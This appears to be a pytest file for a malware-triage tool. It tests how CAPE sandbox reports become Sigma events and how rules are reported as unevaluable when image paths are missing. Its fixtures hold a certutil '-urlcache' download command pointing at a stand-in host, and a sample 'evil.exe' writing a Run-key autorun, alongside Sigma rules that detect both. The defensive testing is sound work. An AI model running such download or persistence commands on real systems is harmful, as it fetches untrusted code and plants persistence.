"""A Sigma process event carries the image's full path where the report holds it.

930 shipped rules anchor ``Image|endswith`` on a backslash (``'\\certutil.exe'``).
The events used to carry the process name alone, so those rules could never
fire, and their silence read as a negative. The image's path is read from the
process row's declared fields (``schemas.sandbox_document``): the
``module_path`` a CAPE report writes, or a name that is itself a path. Where
the report holds no path the name stays a name — no path is made up — and a
rule testing a path on it is unknown there: the tool's answer lists it as not
evaluable for that event, with the field, rather than as a negative. An event
carries only the fields the report holds for it.
"""

from __future__ import annotations

import json
import textwrap
from pathlib import Path
from typing import Any

import pytest

from maljan.analysis.sigma_layer import build_events_from_sandbox, read_sandbox_events
from maljan.tools import rules as tool

_FIXTURES = Path(__file__).resolve().parents[2] / "fixtures" / "sandbox"

CERTUTIL_RULE = r"""
title: Certutil Download
id: 0c000000-0000-4000-8000-000000000001
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains: 'urlcache'
    condition: selection
"""

PARENT_RULE = r"""
title: Shell Under Office
id: 0c000000-0000-4000-8000-000000000002
logsource: {category: process_creation, product: windows}
detection:
    selection:
        ParentImage|endswith: '\winword.exe'
    condition: selection
"""

NAME_RULE = r"""
title: Certutil By Name
id: 0c000000-0000-4000-8000-000000000003
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: 'certutil.exe'
    condition: selection
"""


def _cape_document(with_paths: bool) -> dict[str, Any]:
    """Process rows as a CAPE report writes them: ``process_id``, ``parent_id``, ``module_path``."""
    word = {"process_id": 100, "parent_id": 4, "process_name": "WINWORD.EXE"}
    cert = {
        "process_id": 200,
        "parent_id": 100,
        "process_name": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://x/a.exe a.exe",
    }
    if with_paths:
        word["module_path"] = "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
        cert["module_path"] = "C:\\Windows\\System32\\certutil.exe"
    return {"behavior": {"processes": [word, cert]}}


@pytest.fixture()
def sigma_dir(tmp_path: Path) -> Any:
    directory = tmp_path / "sigma"
    directory.mkdir()
    for name, body in (("c.yml", CERTUTIL_RULE), ("p.yml", PARENT_RULE), ("n.yml", NAME_RULE)):
        (directory / name).write_text(textwrap.dedent(body), encoding="utf-8")
    tool.reset_rule_caches()
    yield str(directory)
    tool.reset_rule_caches()


class TestTheImageIsThePathTheReportHolds:
    def test_a_cape_row_gives_its_module_path_and_its_parents(self) -> None:
        read = read_sandbox_events(_cape_document(with_paths=True))
        child = next(e for e in read.events if "certutil" in e.get("CommandLine", ""))
        assert child["Image"] == "C:\\Windows\\System32\\certutil.exe"
        assert child["ParentImage"] == "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
        assert read.image_path_unknown == {}

    def test_a_name_that_is_a_path_is_the_path(self) -> None:
        document = {
            "behavior": {
                "processes": [
                    {"pid": 7, "ppid": 0, "process_name": "C:\\Users\\a\\invoice.exe"},
                ]
            }
        }
        read = read_sandbox_events(document)
        assert read.events[0]["Image"] == "C:\\Users\\a\\invoice.exe"
        assert read.image_path_unknown == {}

    def test_the_stored_cape_fixture_carries_its_module_paths(self) -> None:
        raw = json.loads((_FIXTURES / "cape2_report.json").read_text(encoding="utf-8"))
        events = build_events_from_sandbox(raw)
        images = {e["Image"] for e in events if "Image" in e}
        assert "C:\\Users\\Admin\\AppData\\Local\\Temp\\000ac83fe38ca68495fc.exe" in images


class TestTheCommandLineIsTheOneTheReportHolds:
    def test_a_cape_row_gives_the_command_line_of_its_recorded_environment(self) -> None:
        document = {
            "behavior": {
                "processes": [
                    {
                        "process_id": 9,
                        "parent_id": 1,
                        "process_name": "svchost.exe",
                        "module_path": "C:\\Windows\\System32\\svchost.exe",
                        "environ": {
                            "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs "
                        },
                    }
                ]
            }
        }
        (event,) = build_events_from_sandbox(document)
        assert event["CommandLine"] == "C:\\Windows\\system32\\svchost.exe -k netsvcs"

    def test_no_command_line_is_made_up_from_the_name(self) -> None:
        document = {"behavior": {"processes": [{"pid": 9, "process_name": "svchost.exe"}]}}
        (event,) = build_events_from_sandbox(document)
        assert event == {"Image": "svchost.exe"}


class TestNoPathIsMadeUp:
    def test_a_bare_name_stays_a_name_and_is_said_to_have_no_path(self) -> None:
        read = read_sandbox_events(_cape_document(with_paths=False))
        child_index, child = next(
            (i, e) for i, e in enumerate(read.events) if "certutil" in e.get("CommandLine", "")
        )
        assert child["Image"] == "certutil.exe"
        assert child["ParentImage"] == "WINWORD.EXE"
        assert read.image_path_unknown[child_index] == ("Image", "ParentImage")
        assert read.image_path_unknown[0] == ("Image",)


class TestAnEventCarriesOnlyWhatWasCollected:
    def test_an_unmonitored_parent_gives_no_parent_image(self) -> None:
        document = {
            "behavior": {
                "processes": [
                    {
                        "process_id": 9,
                        "parent_id": 640,
                        "process_name": "svchost.exe",
                        "module_path": "C:\\Windows\\System32\\svchost.exe",
                    }
                ]
            }
        }
        (event,) = build_events_from_sandbox(document)
        assert "ParentImage" not in event

    def test_a_value_collected_empty_is_kept_empty(self) -> None:
        document = {"behavior": {"processes": [{"pid": 3, "process_name": "a.exe", "cmd": ""}]}}
        (event,) = build_events_from_sandbox(document)
        assert event == {"Image": "a.exe", "CommandLine": ""}

    def test_a_registry_event_carries_details_only_where_a_value_argument_exists(self) -> None:
        document = {
            "behavior": {
                "calls": [
                    {"api": "RegCreateKeyExW", "arguments": [{"FullName": "HKCU\\a"}]},
                    {
                        "api": "RegSetValueExW",
                        "arguments": [{"FullName": "HKCU\\b"}, {"Buffer": ""}],
                    },
                ]
            }
        }
        read = read_sandbox_events(document)
        assert read.events == [
            {"TargetObject": "HKCU\\a"},
            {"TargetObject": "HKCU\\b", "Details": ""},
        ]
        assert read.kinds == ["registry_add", "registry_set"]
        assert read.contexts()[1].categories == frozenset({"registry_set", "registry_event"})


RUN_KEY_RULE = r"""
title: Autorun Run Key Not By A Known Installer
id: 0c000000-0000-4000-8000-000000000004
logsource: {category: registry_set, product: windows}
detection:
    selection:
        TargetObject|contains: '\Software\Microsoft\Windows\CurrentVersion\Run'
    filter_installer:
        Image|endswith: '\msiexec.exe'
    condition: selection and not filter_installer
"""

_RUN = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"


def _set_value(key: str) -> dict[str, Any]:
    return {
        "api": "RegSetValueExW",
        "arguments": [{"name": "FullName", "value": key}, {"name": "Buffer", "value": "c:\\a.exe"}],
    }


class TestARegistryEventIsReadUnderTheProcessThatMadeIt:
    def test_a_cape_process_calls_give_registry_events_with_its_image(self) -> None:
        document = {
            "behavior": {
                "processes": [
                    {
                        "process_id": 5,
                        "process_name": "evil.exe",
                        "module_path": "C:\\Users\\a\\evil.exe",
                        "calls": [_set_value(_RUN), {"api": "NtClose", "arguments": []}],
                    }
                ]
            }
        }
        read = read_sandbox_events(document)
        assert read.kinds == ["process_creation", "registry_set"]
        assert read.events[1] == {
            "Image": "C:\\Users\\a\\evil.exe",
            "TargetObject": _RUN,
            "Details": "c:\\a.exe",
        }
        assert read.image_path_unknown == {}

    def test_a_call_both_lists_hold_is_read_once(self) -> None:
        call = _set_value(_RUN)
        document = {
            "behavior": {
                "processes": [{"pid": 5, "process_name": "evil.exe", "calls": [dict(call)]}],
                "calls": [dict(call)],
            }
        }
        read = read_sandbox_events(document)
        assert read.kinds == ["process_creation", "registry_set"]
        assert read.image_path_unknown == {0: ("Image",), 1: ("Image",)}

    def test_identical_flat_only_calls_are_each_an_event(self) -> None:
        call = _set_value(_RUN)
        read = read_sandbox_events({"behavior": {"calls": [dict(call) for _ in range(3)]}})
        assert read.kinds == ["registry_set"] * 3

    def test_identical_calls_under_one_process_are_each_an_event(self) -> None:
        call = _set_value(_RUN)
        document = {
            "behavior": {
                "processes": [
                    {"pid": 5, "process_name": "a.exe", "calls": [dict(call), dict(call)]}
                ]
            }
        }
        assert read_sandbox_events(document).kinds == ["process_creation"] + ["registry_set"] * 2

    def test_their_flat_copies_add_none(self) -> None:
        call = _set_value(_RUN)
        document = {
            "behavior": {
                "processes": [
                    {"pid": 5, "process_name": "a.exe", "calls": [dict(call), dict(call)]}
                ],
                "calls": [dict(call), dict(call)],
            }
        }
        assert read_sandbox_events(document).kinds == ["process_creation"] + ["registry_set"] * 2

    def test_a_run_key_write_fires_the_autorun_rule(self, tmp_path: Path) -> None:
        directory = tmp_path / "sigma"
        directory.mkdir()
        (directory / "r.yml").write_text(textwrap.dedent(RUN_KEY_RULE), encoding="utf-8")
        tool.reset_rule_caches()
        try:
            document = {
                "behavior": {
                    "processes": [
                        {
                            "process_id": 5,
                            "process_name": "evil.exe",
                            "module_path": "C:\\Users\\a\\evil.exe",
                            "calls": [_set_value(_RUN)],
                        }
                    ]
                }
            }
            result = tool.sigma_match_sandbox(document, ruleset=str(directory))
        finally:
            tool.reset_rule_caches()
        assert [m["title"] for m in result["matches"]] == [
            "Autorun Run Key Not By A Known Installer"
        ]


class TestTheToolSaysWhichRulesItCouldNotEvaluate:
    def test_with_the_path_the_path_anchored_rules_fire(self, sigma_dir: str) -> None:
        result = tool.sigma_match_sandbox(_cape_document(with_paths=True), ruleset=sigma_dir)
        titles = sorted(m["title"] for m in result["matches"])
        assert titles == ["Certutil By Name", "Certutil Download", "Shell Under Office"]
        assert "not_evaluable" not in result

    def test_without_the_path_they_are_reported_unevaluable_not_negative(
        self, sigma_dir: str
    ) -> None:
        result = tool.sigma_match_sandbox(_cape_document(with_paths=False), ruleset=sigma_dir)
        assert [m["title"] for m in result["matches"]] == ["Certutil By Name"]
        unknown = result["not_evaluable"]
        assert "image path unknown" in unknown["note"]
        assert unknown["rules"] == 2
        assert unknown["rows"] == [
            {
                "events": [[0, 0]],
                "rules": 2,
                "fields": {"CommandLine": 1, "Image path": 1, "ParentImage": 1},
            },
            {"events": [[1, 1]], "rules": 2, "fields": {"Image path": 1, "ParentImage path": 1}},
        ]

    def test_events_alike_share_one_row_of_runs(self, sigma_dir: str) -> None:
        processes = [
            {"pid": 10 + i, "process_name": "a.exe", "command_line": f"a.exe {i}"} for i in range(6)
        ]
        processes.insert(3, {"pid": 99, "process_name": "b.exe"})
        result = tool.sigma_match_sandbox({"behavior": {"processes": processes}}, sigma_dir)
        rows = result["not_evaluable"]["rows"]
        alike = [row for row in rows if row["events"] == [[0, 2], [4, 6]]]
        assert len(alike) == 1
        assert sum(r[1] - r[0] + 1 for row in rows for r in row["events"]) == 7

    def test_the_pack_summary_says_it_too(self, sigma_dir: str) -> None:
        from maljan.pipeline.triage_pack import _sigma

        result = tool.sigma_match_sandbox(_cape_document(with_paths=False), ruleset=sigma_dir)
        text = _sigma(result)
        assert (
            "2 rules not evaluable on 2 events "
            "(a field not collected, or image path unknown on 2 events)"
        ) in text
